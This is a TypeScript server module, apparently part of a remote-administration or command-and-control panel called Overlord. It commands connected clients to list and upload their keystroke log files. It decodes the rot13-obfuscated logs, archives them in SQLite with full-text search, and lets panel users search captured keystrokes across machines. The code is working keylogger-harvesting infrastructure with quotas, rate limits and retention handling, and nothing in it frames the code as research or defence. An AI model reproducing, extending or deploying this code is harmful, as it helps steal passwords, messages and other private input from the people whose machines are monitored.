import type { ServerWebSocket } from "bun";
import { db, type TypedDatabase } from "../db/connection";
import { getConfig } from "../config";
import { logger } from "../logger";
import { encodeMessage } from "../protocol";
import type { SocketData } from "../sessions/types";
import { canUserAccessClient, getUsersWithInputArchiveEnabled } from "../users";

type KeylogFileMeta = {
  name: string;
  size: number;
  date: string;
  modifiedAt: number | null;
};

type PendingArchiveFiles = {
  files: Map<string, KeylogFileMeta>;
  expiresAt: number;
};

const pendingFileMeta = new Map<string, PendingArchiveFiles>();
const archiveMessageRates = new Map<string, { windowStart: number; count: number }>();
const MAX_RETRIEVES_PER_LIST = 25;
const MAX_FILES_PER_LIST = 100_000;
const MAX_KEYLOG_FILENAME_LENGTH = 255;
const MAX_ARCHIVE_FILES_PER_CLIENT = 100_000;
const MAX_ARCHIVE_BYTES_PER_CLIENT = 10 * 1024 * 1024 * 1024;
const DEFAULT_MAX_ARCHIVE_FILES_GLOBAL = 1_000_000;
const DEFAULT_MAX_ARCHIVE_BYTES_GLOBAL = 64 * 1024 * 1024 * 1024;
const MAX_ARCHIVE_ROWS_PRUNED_PER_SAVE = 5_000;
const KEYLOG_CONTENT_BYTES_SQL = "COALESCE(LENGTH(CAST(content AS BLOB)), 0)";
const PENDING_ARCHIVE_TTL_MS = 5 * 60_000;
const MAX_PENDING_ARCHIVE_CLIENTS = 5_000;

export type KeylogArchiveQuotaLimits = {
  perClientFiles: number;
  perClientBytes: number;
  globalFiles: number;
  globalBytes: number;
};

export type KeylogArchiveRecord = {
  clientId: string;
  filename: string;
  size: number;
  modifiedAt: number | null;
  retrievedAt: number;
  content: string;
};

function positiveArchiveLimit(name: string, fallback: number, maximum: number): number {
  const parsed = Number(process.env[name]);
  if (!Number.isSafeInteger(parsed) || parsed <= 0) return fallback;
  return Math.min(parsed, maximum);
}

function getKeylogArchiveQuotaLimits(): KeylogArchiveQuotaLimits {
  return {
    perClientFiles: MAX_ARCHIVE_FILES_PER_CLIENT,
    perClientBytes: MAX_ARCHIVE_BYTES_PER_CLIENT,
    globalFiles: positiveArchiveLimit(
      "OVERLORD_INPUT_ARCHIVE_GLOBAL_MAX_FILES",
      DEFAULT_MAX_ARCHIVE_FILES_GLOBAL,
      1_000_000,
    ),
    globalBytes: positiveArchiveLimit(
      "OVERLORD_INPUT_ARCHIVE_GLOBAL_MAX_BYTES",
      DEFAULT_MAX_ARCHIVE_BYTES_GLOBAL,
      64 * 1024 * 1024 * 1024,
    ),
  };
}

function deleteArchivedKeylogRows(
  database: TypedDatabase,
  ids: number[],
): void {
  if (ids.length === 0) return;
  const deleteFile = database.prepare("DELETE FROM keylog_archive_files WHERE id = ?");
  let deleteFts: { run(...params: any[]): unknown } | null = null;
  try {
    deleteFts = database.prepare("DELETE FROM keylog_archive_fts WHERE rowid = ?");
  } catch {
    // FTS5 is optional on SQLite builds that do not provide it.
  }
  for (const id of ids) {
    deleteFts?.run(id);
    deleteFile.run(id);
  }
}

function replaceArchivedKeylogFts(
  database: TypedDatabase,
  row: { id: number; client_id: string; filename: string; content: string },
): void {
  try {
    database.prepare("DELETE FROM keylog_archive_fts WHERE rowid = ?").run(row.id);
    database.prepare(
      `INSERT INTO keylog_archive_fts(rowid, file_id, client_id, filename, content)
       VALUES (?, ?, ?, ?, ?)`,
    ).run(row.id, row.id, row.client_id, row.filename, row.content);
  } catch {
    // The archive remains usable without full-text search. Search already has
    // a bounded LIKE fallback for SQLite builds without FTS5.
  }
}

type ArchivedKeylogQuotaRow = { id: number; bytes: number };
type ArchivedKeylogQuotaTotals = { files: number; bytes: number };

function getArchivedKeylogQuotaTotals(
  database: TypedDatabase,
  clientId: string | null,
): ArchivedKeylogQuotaTotals {
  const row = clientId === null
    ? database.prepare(
      `SELECT COUNT(*) AS files, COALESCE(SUM(${KEYLOG_CONTENT_BYTES_SQL}), 0) AS bytes
       FROM keylog_archive_files`,
    ).get()
    : database.prepare(
      `SELECT COUNT(*) AS files, COALESCE(SUM(${KEYLOG_CONTENT_BYTES_SQL}), 0) AS bytes
       FROM keylog_archive_files WHERE client_id = ?`,
    ).get(clientId);
  return row as ArchivedKeylogQuotaTotals;
}

function archivedKeylogScopeFits(
  database: TypedDatabase,
  clientId: string | null,
  projectedFilesDelta: number,
  projectedBytesDelta: number,
  maxFiles: number,
  maxBytes: number,
): boolean {
  const totals = getArchivedKeylogQuotaTotals(database, clientId);
  return Number(totals.files || 0) + projectedFilesDelta <= maxFiles
    && Number(totals.bytes || 0) + projectedBytesDelta <= maxBytes;
}

function pruneArchivedKeylogScope(
  database: TypedDatabase,
  clientId: string | null,
  protectedId: number | null,
  projectedFilesDelta: number,
  projectedBytesDelta: number,
  maxFiles: number,
  maxBytes: number,
): boolean {
  const totals = getArchivedKeylogQuotaTotals(database, clientId);
  let files = Number(totals.files || 0) + projectedFilesDelta;
  let bytes = Number(totals.bytes || 0) + projectedBytesDelta;
  if (files <= maxFiles && bytes <= maxBytes) return true;

  const clauses: string[] = [];
  const params: Array<string | number> = [];
  if (clientId !== null) {
    clauses.push("client_id = ?");
    params.push(clientId);
  }
  if (protectedId !== null) {
    clauses.push("id <> ?");
    params.push(protectedId);
  }
  const where = clauses.length > 0 ? `WHERE ${clauses.join(" AND ")}` : "";
  const candidates = database.prepare(
    `SELECT id, ${KEYLOG_CONTENT_BYTES_SQL} AS bytes
     FROM keylog_archive_files
     ${where}
     ORDER BY retrieved_at ASC, id ASC
     LIMIT ?`,
  ).all(...params, MAX_ARCHIVE_ROWS_PRUNED_PER_SAVE) as ArchivedKeylogQuotaRow[];

  const pruneIds: number[] = [];
  for (const candidate of candidates) {
    pruneIds.push(candidate.id);
    files -= 1;
    bytes -= Number(candidate.bytes || 0);
    if (files <= maxFiles && bytes <= maxBytes) break;
  }

  // Persist a bounded reconciliation batch even if admitting the incoming row
  // will require another pass. The incoming/protected row is not mutated.
  deleteArchivedKeylogRows(database, pruneIds);
  return files <= maxFiles && bytes <= maxBytes;
}

/**
 * Build the archive writer separately so quota, pruning, and FTS consistency
 * can be regression-tested against an isolated SQLite database.
 */
export function createKeylogArchiveWriter(
  database: TypedDatabase,
  quotaProvider: () => KeylogArchiveQuotaLimits = getKeylogArchiveQuotaLimits,
): (record: KeylogArchiveRecord) => boolean {
  const transaction = database.transaction((record: KeylogArchiveRecord): boolean => {
    const limits = quotaProvider();
    const contentBytes = typeof record.content === "string"
      ? Buffer.byteLength(record.content, "utf8")
      : -1;
    if (
      typeof record.clientId !== "string"
      || record.clientId.length === 0
      || record.clientId.length > 128
      || typeof record.filename !== "string"
      || record.filename.length === 0
      || record.filename.length > MAX_KEYLOG_FILENAME_LENGTH
      || !Number.isSafeInteger(record.size)
      || record.size < 0
      || record.size !== contentBytes
      || limits.perClientFiles <= 0
      || limits.perClientBytes <= 0
      || limits.globalFiles <= 0
      || limits.globalBytes <= 0
      || record.size > limits.perClientBytes
      || record.size > limits.globalBytes
    ) return false;

    const old = database.prepare(
      `SELECT id, ${KEYLOG_CONTENT_BYTES_SQL} AS bytes
       FROM keylog_archive_files WHERE client_id = ? AND filename = ?`,
    ).get(record.clientId, record.filename) as { id: number; bytes: number } | undefined;
    const projectedFilesDelta = old ? 0 : 1;
    const projectedBytesDelta = record.size - Number(old?.bytes || 0);
    let perClientSatisfied = pruneArchivedKeylogScope(
      database,
      record.clientId,
      old?.id ?? null,
      projectedFilesDelta,
      projectedBytesDelta,
      limits.perClientFiles,
      limits.perClientBytes,
    );
    const globalSatisfied = pruneArchivedKeylogScope(
      database,
      null,
      old?.id ?? null,
      projectedFilesDelta,
      projectedBytesDelta,
      limits.globalFiles,
      limits.globalBytes,
    );
    if (!perClientSatisfied && globalSatisfied) {
      // Fleet pruning may also have removed rows from this client, so use the
      // post-global state rather than conservatively requiring another write.
      perClientSatisfied = archivedKeylogScopeFits(
        database,
        record.clientId,
        projectedFilesDelta,
        projectedBytesDelta,
        limits.perClientFiles,
        limits.perClientBytes,
      );
    }
    if (!perClientSatisfied || !globalSatisfied) return false;

    database.prepare(
      `INSERT INTO keylog_archive_files(client_id, filename, size, modified_at, retrieved_at, content)
       VALUES (?, ?, ?, ?, ?, ?)
       ON CONFLICT(client_id, filename) DO UPDATE SET
         size = excluded.size,
         modified_at = excluded.modified_at,
         retrieved_at = excluded.retrieved_at,
         content = excluded.content`,
    ).run(
      record.clientId,
      record.filename,
      record.size,
      record.modifiedAt,
      record.retrievedAt,
      record.content,
    );
    const stored = database.prepare(
      "SELECT id, client_id, filename, content FROM keylog_archive_files WHERE client_id = ? AND filename = ?",
    ).get(record.clientId, record.filename) as {
      id: number;
      client_id: string;
      filename: string;
      content: string;
    } | undefined;
    if (!stored) throw new Error("keylog archive write did not persist a row");
    replaceArchivedKeylogFts(database, stored);
    return true;
  });

  return transaction;
}

const storeArchivedKeylog = createKeylogArchiveWriter(db);

function consumeArchiveMessageRate(clientId: string, kind: "list" | "content"): boolean {
  const now = Date.now();
  const windowMs = 60_000;
  const max = kind === "list" ? 6 : 60;
  const key = `${clientId}:${kind}`;
  let state = archiveMessageRates.get(key);
  if (!state || now - state.windowStart >= windowMs) {
    state = { windowStart: now, count: 0 };
  }
  state.count += 1;
  archiveMessageRates.set(key, state);
  if (archiveMessageRates.size > 10_000) {
    for (const [rateKey, entry] of archiveMessageRates) {
      if (now - entry.windowStart >= windowMs * 2) archiveMessageRates.delete(rateKey);
    }
  }
  return state.count <= max;
}

function setPendingFiles(clientId: string, files: Map<string, KeylogFileMeta>): void {
  const now = Date.now();
  for (const [pendingClientId, entry] of pendingFileMeta) {
    if (entry.expiresAt <= now) pendingFileMeta.delete(pendingClientId);
  }
  if (!pendingFileMeta.has(clientId) && pendingFileMeta.size >= MAX_PENDING_ARCHIVE_CLIENTS) {
    const oldest = pendingFileMeta.keys().next().value as string | undefined;
    if (oldest) pendingFileMeta.delete(oldest);
  }
  pendingFileMeta.set(clientId, { files, expiresAt: now + PENDING_ARCHIVE_TTL_MS });
}

function rot13(str: string): string {
  return String(str || "").replace(/[a-zA-Z]/g, (char) => {
    const start = char <= "Z" ? 65 : 97;
    return String.fromCharCode(((char.charCodeAt(0) - start + 13) % 26) + start);
  });
}

function normalizeMeta(file: any): KeylogFileMeta | null {
  const name = typeof file?.name === "string" ? file.name.trim() : "";
  if (
    !name ||
    name.length > MAX_KEYLOG_FILENAME_LENGTH ||
    name === "." ||
    name === ".." ||
    name.includes("/") ||
    name.includes("\\")
  ) return null;
  const rawSize = Number(file?.size);
  if (!Number.isSafeInteger(rawSize) || rawSize < 0) return null;
  const size = rawSize;
  const date = typeof file?.date === "string" ? file.date.slice(0, 64) : "";
  const parsed = date ? Date.parse(date) : NaN;
  return {
    name,
    size,
    date,
    modifiedAt: Number.isFinite(parsed) ? parsed : null,
  };
}

function takePendingMeta(clientId: string, filename: string): KeylogFileMeta | null {
  const pending = pendingFileMeta.get(clientId);
  if (!pending || pending.expiresAt <= Date.now()) {
    pendingFileMeta.delete(clientId);
    return null;
  }
  const meta = pending.files.get(filename) ?? null;
  pending.files.delete(filename);
  if (pending.files.size === 0) pendingFileMeta.delete(clientId);
  return meta;
}

function shouldArchiveForClient(clientId: string): boolean {
  const config = getConfig().inputArchive;
  if (!config?.enabled) return false;
  const users = getUsersWithInputArchiveEnabled();
  return users.some((user) => canUserAccessClient(user.id, user.role, clientId));
}

function buildFtsQuery(query: string): string {
  return query
    .trim()
    .split(/\s+/)
    .map((term) => term.replace(/"/g, "").trim())
    .filter((term) => term.length >= 2)
    .map((term) => `"${term}"*`)
    .join(" ");
}

function archiveKeylogContent(clientId: string, filename: string, encodedContent: string): void {
  if (!shouldArchiveForClient(clientId)) return;
  const normalized = normalizeMeta({ name: filename, size: 0, date: "" });
  if (!normalized || normalized.name !== filename) return;
  const safeMeta = takePendingMeta(clientId, filename);
  if (!safeMeta) {
    logger.warn(`[keylog-archive] ignored unsolicited content for ${clientId}/${filename}`);
    return;
  }
  const maxFileBytes = Math.max(1, getConfig().inputArchive.maxFileBytes);
  const encodedBytes = Buffer.byteLength(encodedContent, "utf8");
  if (safeMeta.size > maxFileBytes || encodedBytes > maxFileBytes) {
    logger.warn(`[keylog-archive] rejected oversized content for ${clientId}/${filename}`);
    return;
  }
  const decoded = rot13(String(encodedContent || ""));
  const now = Date.now();
  const size = encodedBytes;
  const modifiedAt = safeMeta.modifiedAt;

  if (!storeArchivedKeylog({
    clientId,
    filename,
    size,
    modifiedAt,
    retrievedAt: now,
    content: decoded,
  })) {
    logger.warn(`[keylog-archive] rejected ${clientId}/${filename}: archive quota exceeded`);
    return;
  }
}

export function handleKeylogArchiveMessage(clientId: string, payload: any, ws?: ServerWebSocket<SocketData>): void {
  if (!payload || typeof payload.type !== "string") return;
  if (!shouldArchiveForClient(clientId)) return;

  if (payload.type === "keylog_file_list") {
    if (!consumeArchiveMessageRate(clientId, "list")) {
      logger.warn(`[keylog-archive] ignored excessive file lists from ${clientId}`);
      return;
    }
    const files = Array.isArray(payload.files)
      ? payload.files.slice(0, MAX_FILES_PER_LIST).map(normalizeMeta).filter(Boolean) as KeylogFileMeta[]
      : [];
    if (files.length === 0 || !ws) return;

    const maxFileBytes = getConfig().inputArchive.maxFileBytes;
    const existingRows = db
      .prepare(
        `SELECT filename, ${KEYLOG_CONTENT_BYTES_SQL} as size, modified_at as modifiedAt
         FROM keylog_archive_files WHERE client_id = ?
         ORDER BY retrieved_at DESC LIMIT ?`,
      )
      .all(clientId, MAX_ARCHIVE_FILES_PER_CLIENT) as Array<{ filename: string; size: number; modifiedAt: number | null }>;
    const totals = db.prepare(
      `SELECT COUNT(*) AS files, COALESCE(SUM(${KEYLOG_CONTENT_BYTES_SQL}), 0) AS bytes
       FROM keylog_archive_files WHERE client_id = ?`,
    ).get(clientId) as { files: number; bytes: number };
    const existing = new Map(existingRows.map((row) => [row.filename, row]));
    const pending = new Map<string, KeylogFileMeta>();

    let requested = 0;
    let projectedFiles = Number(totals.files || 0);
    let projectedBytes = Number(totals.bytes || 0);
    for (const file of files) {
      if (file.size > maxFileBytes) continue;
      const old = existing.get(file.name);
      const changed = !old || old.size !== file.size || (file.modifiedAt !== null && old.modifiedAt !== file.modifiedAt);
      if (!changed || requested >= MAX_RETRIEVES_PER_LIST) continue;
      const nextFiles = projectedFiles + (old ? 0 : 1);
      const nextBytes = projectedBytes - Number(old?.size || 0) + file.size;
      if (
        nextFiles > MAX_ARCHIVE_FILES_PER_CLIENT
        || nextBytes > MAX_ARCHIVE_BYTES_PER_CLIENT
      ) continue;
      pending.set(file.name, file);
      try {
        ws.send(encodeMessage({
          type: "command",
          commandType: "keylog_retrieve",
          id: crypto.randomUUID(),
          payload: { filename: file.name },
        } as any));
        requested++;
        projectedFiles = nextFiles;
        projectedBytes = nextBytes;
      } catch (err) {
        logger.warn(`[keylog-archive] failed to request ${clientId}/${file.name}: ${(err as Error).message}`);
      }
    }
    if (pending.size > 0) setPendingFiles(clientId, pending);
    else pendingFileMeta.delete(clientId);
    return;
  }

  if (payload.type === "keylog_file_content" && typeof payload.filename === "string") {
    if (typeof payload.content !== "string") return;
    if (!consumeArchiveMessageRate(clientId, "content")) {
      logger.warn(`[keylog-archive] ignored excessive file content from ${clientId}`);
      return;
    }
    archiveKeylogContent(clientId, payload.filename, payload.content);
  }
}

export function dispatchKeylogArchiveSync(clientId: string, ws: ServerWebSocket<SocketData>): boolean {
  if (!shouldArchiveForClient(clientId)) return false;
  try {
    ws.send(encodeMessage({
      type: "command",
      commandType: "keylog_list",
      id: crypto.randomUUID(),
    } as any));
    return true;
  } catch (err) {
    logger.warn(`[keylog-archive] failed to request file list for ${clientId}: ${(err as Error).message}`);
    return false;
  }
}

export function listArchivedKeylogs(clientId: string): Array<{ name: string; size: number; date: string; archived: true; retrievedAt: number }> {
  const rows = db
    .prepare(
      `SELECT filename, ${KEYLOG_CONTENT_BYTES_SQL} as size,
              modified_at as modifiedAt, retrieved_at as retrievedAt
       FROM keylog_archive_files
       WHERE client_id = ?
       ORDER BY COALESCE(modified_at, retrieved_at) DESC, filename ASC
       LIMIT ?`,
    )
    .all(clientId, MAX_ARCHIVE_FILES_PER_CLIENT) as Array<{ filename: string; size: number; modifiedAt: number | null; retrievedAt: number }>;

  return rows.map((row) => ({
    name: row.filename,
    size: row.size,
    date: new Date(row.modifiedAt || row.retrievedAt).toISOString(),
    archived: true,
    retrievedAt: row.retrievedAt,
  }));
}

export function getArchivedKeylogContent(clientId: string, filename: string): { filename: string; content: string; archived: true } | null {
  const row = db
    .prepare("SELECT filename, content FROM keylog_archive_files WHERE client_id = ? AND filename = ?")
    .get(clientId, filename) as { filename: string; content: string } | undefined;
  if (!row) return null;
  return { filename: row.filename, content: rot13(row.content), archived: true };
}

export function searchArchivedKeylogs(clientId: string, query: string): Array<{ file: string; date: string; matches: Array<{ index: number; context: string; line: number }> }> {
  const trimmed = query.trim();
  if (trimmed.length < 3) return [];

  const ftsQuery = buildFtsQuery(trimmed);
  let rows: Array<{ filename: string; content: string; modifiedAt: number | null; retrievedAt: number }> = [];
  if (ftsQuery) {
    try {
      rows = db
        .prepare(
          `SELECT f.filename, f.content, f.modified_at as modifiedAt, f.retrieved_at as retrievedAt
           FROM keylog_archive_fts
           JOIN keylog_archive_files f ON f.id = keylog_archive_fts.file_id
           WHERE keylog_archive_fts.client_id = ? AND keylog_archive_fts MATCH ?
           ORDER BY COALESCE(f.modified_at, f.retrieved_at) DESC
           LIMIT 100`,
        )
        .all(clientId, ftsQuery) as any[];
    } catch {
      rows = [];
    }
  }

  if (rows.length === 0) {
    rows = db
      .prepare(
        `SELECT filename, content, modified_at as modifiedAt, retrieved_at as retrievedAt
         FROM keylog_archive_files
         WHERE client_id = ? AND lower(content) LIKE ?
         ORDER BY COALESCE(modified_at, retrieved_at) DESC
         LIMIT 100`,
      )
      .all(clientId, `%${trimmed.toLowerCase()}%`) as any[];
  }

  const lowerQuery = trimmed.toLowerCase();
  return rows
    .map((row) => {
      const content = String(row.content || "");
      const lowerContent = content.toLowerCase();
      const matches: Array<{ index: number; context: string; line: number }> = [];
      let index = 0;
      while ((index = lowerContent.indexOf(lowerQuery, index)) !== -1 && matches.length < 25) {
        const start = Math.max(0, index - 50);
        const end = Math.min(content.length, index + trimmed.length + 50);
        let context = content.substring(start, end);
        if (start > 0) context = `...${context}`;
        if (end < content.length) context = `${context}...`;
        matches.push({
          index,
          context,
          line: content.substring(0, index).split("\n").length,
        });
        index += trimmed.length;
      }
      return {
        file: row.filename,
        date: new Date(row.modifiedAt || row.retrievedAt).toISOString(),
        matches,
      };
    })
    .filter((result) => result.matches.length > 0);
}

export function pruneExpiredKeylogArchive(): number {
  const retentionDays = getConfig().inputArchive?.retentionDays ?? 7;
  const cutoff = Date.now() - retentionDays * 24 * 60 * 60 * 1000;
  const ids = db
    .prepare("SELECT id FROM keylog_archive_files WHERE retrieved_at < ? LIMIT 5000")
    .all(cutoff) as Array<{ id: number }>;
  if (ids.length === 0) return 0;

  const deleteFts = db.prepare("DELETE FROM keylog_archive_fts WHERE rowid = ?");
  const deleteFile = db.prepare("DELETE FROM keylog_archive_files WHERE id = ?");
  const tx = db.transaction((rows: Array<{ id: number }>) => {
    for (const row of rows) {
      deleteFts.run(row.id);
      deleteFile.run(row.id);
    }
  });
  tx(ids);
  return ids.length;
}
